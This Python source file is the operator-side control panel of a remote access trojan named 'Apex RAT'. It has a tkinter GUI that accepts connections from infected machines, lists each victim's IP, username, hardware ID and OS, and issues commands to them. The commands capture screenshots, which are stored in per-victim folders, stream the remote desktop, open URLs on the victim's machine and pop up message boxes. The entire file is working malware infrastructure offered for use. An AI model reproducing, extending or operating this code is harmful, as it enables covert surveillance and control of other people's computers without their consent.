import tkinter as tk
from tkinter import ttk
from tkinter import Listbox, Menu #ezzzz
from customtkinter import CTkInputDialog, CTkButton
import socket
import threading
from vidstream import StreamingServer
import time
from os import system as console
import os
import datetime
from PIL import Image, ImageTk #menu icons

version = "1.0 beta"

art = r"""
[Apex RAT] [/]: https://github.com/3verlaster
_____________________________________________________________

 █████╗ ██████╗ ███████╗██╗  ██╗    ██████╗  █████╗ ████████╗
██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝    ██╔══██╗██╔══██╗╚══██╔══╝
███████║██████╔╝█████╗   ╚███╔╝     ██████╔╝███████║   ██║   
██╔══██║██╔═══╝ ██╔══╝   ██╔██╗     ██╔══██╗██╔══██║   ██║   
██║  ██║██║     ███████╗██╔╝ ██╗    ██║  ██║██║  ██║   ██║   
╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
"""

print(art)

with open("connect.apex", 'r') as file:
    host, port_str = file.read().split(":")
    port = int(port_str)
    #print(f" HOST = [{host}] PORT = [{port}]")

class StoppableHostThread(threading.Thread):
    def __init__(self):
        super().__init__()
        self.stop_flag = threading.Event()

    def run(self):
        while not self.stop_flag.is_set():
            global stream_host
            try:
                global art
                console("cls")
                print(art)
                stream_host = StreamingServer(host, 4224)
                stream_host.start_server()
                while input('[Apex RAT] Write "stop" to close remote desktop -----> ') != "stop":
                    console("cls")
                    print(art)
                    continue

                stream_host.stop_server()
                console("cls")
                print(art)
                break
            except OSError:
                pass
            # Your code here
            #print('[DEBUG] Thread is running.')
            time.sleep(1)

    def stop(self):
        self.stop_flag.set()


# class StoppableWindowThread(threading.Thread):
#     def __init__(self):
#         super().__init__()
#         self.stop_flag = threading.Event()

#     def run(self):
#         while not self.stop_flag.is_set():
#             global app
#             app = tk.Tk()
#             app.title("Apex RAT | BUTTON")
#             app.attributes("-topmost",True)
#             button = tk.Button(master=app, text="STOP", command=stop_host_stream).pack()
#             app.mainloop()
#             #print('[DEBUG] Thread is running.')
#             time.sleep(1)

#     def stop(self):
#         self.stop_flag.set()


class Developer: # ^^
    name = "Nikita"
    username = "3verlaster"
    github_link = "https://github.com/3verlaster"
    solo = True


#stream_host_th.start()
#stream_host.stop_server()

# Создание сервера
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#server_socket.bind(('127.0.0.1', 12345))
server_socket.bind((host, port))
server_socket.listen(5)

# GUI
root = tk.Tk()
root.resizable(True, False)
try:
    root.iconbitmap("assets/apex.ico")
except:
    pass
clients_number = 0
root.title(f"Apex RAT v{version} | PORT: {port_str} | developer: https://github.com/3verlaster")
root.geometry("700x360")

client_tree = ttk.Treeview(root, columns=("Build", "IP", "Username", "HWID", "OS"))
client_tree.pack(fill=tk.BOTH, expand=True)

# client_tree.heading("#0", text="Client Info") #comm
client_tree.heading("#1", text="Build")
client_tree.heading("#2", text="IP")
client_tree.heading("#3", text="Username")
client_tree.heading("#4", text="HWID")
client_tree.heading("#5", text="OS")

client_tree.column("#0", width=0, anchor='center')
client_tree.column("#1", width=20, anchor='center')
client_tree.column("#2", width=70, anchor='center')
client_tree.column("#3", width=50, anchor='center')
client_tree.column("#4", width=250, anchor='center')
client_tree.column("#5", width=50, anchor='center')



client_sockets = {}
client_info_map = {}  # Словарь для хранения информации о клиентах

server_status_label = tk.Label(root, text="Server Status: Idle", fg="red")
server_status_label.pack(side=tk.LEFT, padx=10, pady=5)

server_clients_number_label = tk.Label(root, text=f"Clients: {clients_number}")
server_clients_number_label.pack(side=tk.RIGHT, padx=10, pady=5)


# OLD POS.
# server_status_label = tk.Label(root, text="Server Status: Idle", fg="red")
# server_status_label.pack(anchor="sw", padx=10, pady=5)
# server_clients_number_label = tk.Label(root, text=f"Clients: {clients_number}")
# server_clients_number_label.pack(padx=0, pady=0, side=tk.RIGHT)

def save_screenshot(screenshot_bytes):
    current_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    script_path = os.path.dirname(os.path.abspath(__file__))

    clients_folder = os.path.join(script_path, "Clients")
    if not os.path.exists(clients_folder):
        os.makedirs(clients_folder)

    curr_hwid_folder = os.path.join(clients_folder, curr_hwid)
    if not os.path.exists(curr_hwid_folder):
        os.makedirs(curr_hwid_folder)

    screenshot_filename = f"{current_time}_screenshot.png"
    screenshot_path = os.path.join(curr_hwid_folder, screenshot_filename)

    with open(screenshot_path, "wb") as screenshot_file:
        screenshot_file.write(screenshot_bytes)

# def save_screenshot(screenshot_bytes):
#     with open("received_scr", "wb") as screenshot_file:
#         screenshot_file.write(screenshot_bytes)

def handle_client(client_socket, client_address):
    global clients_number
    build = client_socket.recv(1024).decode()
    username = client_socket.recv(1024).decode()
    hwid = client_socket.recv(1024).decode()
    os_version = client_socket.recv(1024).decode()

    client_data = (build, client_address[0], username, hwid, os_version)
    client_tree.insert("", "end", values=client_data)
    client_sockets[client_socket] = {"ip": client_address[0], "port": client_address[1], "username": username, "build": build, "hwid": hwid, "os": os_version}
    clients_number += 1

    update_server_status()
    update_clients_number()

    while True:
        try:
            data = client_socket.recv(1024).decode()
            if not data:
                break
            elif data == "ap3x_screenshot":
                screenshot_size = int(client_socket.recv(1024).decode())
                received_data = b""
                while screenshot_size > 0:
                    chunk = client_socket.recv(min(screenshot_size, 1024))
                    if not chunk:
                        break
                    received_data += chunk
                    screenshot_size -= len(chunk)
                save_screenshot(received_data)
                print("[DEBUG] Received screenshot.")
        except:
            break

    del client_sockets[client_socket]
    clients_number -= 1
    update_client_listbox()
    update_server_status()
    update_clients_number()


# def stop_host_stream():
#     global stream_host_thread
#     stream_host.stop_server()
#     stoppable_host_thread.stop()
#     app.destroy()
#     stoppable_window_w_stop_button_th.stop()

def send_command_to_client(client_socket, command):
    client_socket.send(command.encode())

def send_hello_client(selected_client_index):
    if 0 <= selected_client_index < len(client_sockets):
        client_socket = list(client_sockets.keys())[selected_client_index]
        send_command_to_client(client_socket, "Hello, Client!")

def receive_screenshot(selected_client_index):
    global curr_hwid
    if 0 <= selected_client_index < len(client_sockets):
        client_socket = list(client_sockets.keys())[selected_client_index]
        send_command_to_client(client_socket, "ap3x_screenshot")
        curr_hwid = client_sockets[client_socket]['hwid']

def open_url(selected_client_index):
    if 0 <= selected_client_index < len(client_sockets):
        client_socket = list(client_sockets.keys())[selected_client_index]
        curr_user = client_sockets[client_socket]['username']
        curr_user_ip = client_sockets[client_socket]['ip']
        url_window = CTkInputDialog(text="Type in a URL", title=f"Apex RAT | {curr_user_ip}@{curr_user} | Open URL")
        url = url_window.get_input()
        if url.startswith("http://") or url.startswith("https://"):
            send_command_to_client(client_socket, f"URLop3n_ap3x::{url}")
        else:
            pass

def send_message_box(selected_client_index):
    if 0 <= selected_client_index < len(client_sockets):
        client_socket = list(client_sockets.keys())[selected_client_index]
        curr_user = client_sockets[client_socket]['username']
        curr_user_ip = client_sockets[client_socket]['ip']
        message_box_window = CTkInputDialog(text="Type in a text", title=f"Apex RAT | {curr_user_ip}@{curr_user} | MessageBox")
        box_text = message_box_window.get_input()
        #print(box_text)
        send_command_to_client(client_socket, f"Ap3x_MessageBox::{box_text}")

def watch_remote_desktop(selected_client_index):
    ###global stoppable_window_w_stop_button_th
    global stoppable_host_thread
    stoppable_host_thread = StoppableHostThread()
    stoppable_host_thread.start()
    time.sleep(5)
    #stoppable_window_w_stop_button_th = StoppableWindowThread()
    #stoppable_window_w_stop_button_th.start()
    if 0 <= selected_client_index < len(client_sockets):
        client_socket = list(client_sockets.keys())[selected_client_index]
        send_command_to_client(client_socket, "ap3x_rmt_desktop")

def client_context_menu(event):
    try:
        selected_item = client_tree.identify_row(event.y)
        selected_client_index = client_tree.index(selected_item)
        client_menu = tk.Menu(root, tearoff=0)

        # Загрузка и создание объектов PhotoImage для иконок
        send_icon = Image.open("assets/images/context_menu/send_icon.png")
        send_icon = send_icon.resize((16, 16))  
        send_icon = ImageTk.PhotoImage(send_icon)

        screenshot_icon = Image.open("assets/images/context_menu/screenshot_icon.png")
        screenshot_icon = screenshot_icon.resize((16, 16))
        screenshot_icon = ImageTk.PhotoImage(screenshot_icon)

        remote_desktop_icon = Image.open("assets/images/context_menu/remote_desktop_icon.png")
        remote_desktop_icon = remote_desktop_icon.resize((16, 16))
        remote_desktop_icon = ImageTk.PhotoImage(remote_desktop_icon)

        open_url_icon = Image.open("assets/images/context_menu/open_url_icon.png")
        open_url_icon = open_url_icon.resize((16, 16))
        open_url_icon = ImageTk.PhotoImage(open_url_icon)

        messagebox_icon = Image.open("assets/images/context_menu/messagebox_icon.png")
        messagebox_icon = messagebox_icon.resize((16, 16))
        messagebox_icon = ImageTk.PhotoImage(messagebox_icon)

        client_menu.add_command(label="Send Hello", image=send_icon, compound="left", command=lambda: send_hello_client(selected_client_index))
        client_menu.add_command(label="Screenshot", image=screenshot_icon, compound="left", command=lambda: receive_screenshot(selected_client_index))
        client_menu.add_command(label="Remote Desktop", image=remote_desktop_icon, compound="left", command=lambda: watch_remote_desktop(selected_client_index))
        client_menu.add_command(label="Open URL", image=open_url_icon, compound="left", command=lambda: open_url(selected_client_index))
        client_menu.add_command(label="MessageBox", image=messagebox_icon, compound="left", command=lambda: send_message_box(selected_client_index))

        client_menu.post(event.x_root, event.y_root)
    except:
        pass


client_tree.bind("<Button-3>", client_context_menu)

def accept_connections():
    while True:
        client_socket, client_address = server_socket.accept()

        client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_thread.start()

accept_thread = threading.Thread(target=accept_connections)
accept_thread.daemon = True
accept_thread.start()

def update_server_status():
    if len(client_sockets) > 0:
        server_status_label.config(text="Server Status: Running", fg="green")
    else:
        server_status_label.config(text="Server Status: Idle", fg="red")

def update_client_listbox():
    client_tree.delete(*client_tree.get_children())
    for client_socket, client_info in client_sockets.items():
        client_data = (
            client_info['build'],
            client_info['ip'],
            client_info['username'],
            client_info['hwid'],
            client_info['os']
        )
        client_tree.insert("", "end", values=client_data)


def update_clients_number():
    server_clients_number_label.config(text=f"Clients: {clients_number}")

root.mainloop()
